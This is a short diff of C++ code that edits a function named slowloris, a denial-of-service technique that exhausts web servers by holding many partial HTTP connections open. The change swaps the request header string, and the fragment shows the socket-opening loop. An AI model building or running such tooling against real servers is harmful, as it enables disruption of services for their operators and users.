@@ -32,7 +32,7 @@ class InputParser {
 
 void slowloris () {
   std::vector<int> sockets;
-  char header[] = "POST /";
+  char header[] = "GET /l";
   while (true) {
     std::chrono::milliseconds timeout(rand() % 10000 + 1);
     if (sockets.size() < connections) {
